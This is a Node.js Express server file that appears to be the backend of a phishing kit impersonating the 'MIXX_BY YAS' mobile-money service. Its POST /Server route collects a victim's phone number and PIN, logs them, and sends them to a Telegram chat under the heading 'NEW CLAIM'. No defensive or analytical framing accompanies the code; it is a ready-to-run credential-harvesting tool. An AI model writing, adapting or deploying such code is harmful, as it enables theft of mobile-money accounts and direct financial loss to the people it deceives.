require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

app.set('trust proxy', 1);

// Telegram credentials from Railway variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('📱 Telegram Bot:', TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing');
console.log('📱 Chat ID:', TELEGRAM_CHAT_ID || '❌ Missing');

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(express.json());

app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'MIXX_BY YAS Backend running',
    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️'
  });
});

app.post('/Server', async (req, res) => {
  try {
    const { phone, pin } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    }

    console.log('📥 Received:', { phone, pin });

    // Send to Telegram
    let telegramSuccess = false;
    
    try {
      const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString()}`;

      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const response = await axios.post(telegramUrl, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      telegramSuccess = response.data.ok;
      console.log('✅ Telegram sent:', telegramSuccess);
    } catch (error) {
      console.error('❌ Telegram error:', error.message);
    }

    res.json({
      success: true,
      telegram: { sent: telegramSuccess }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
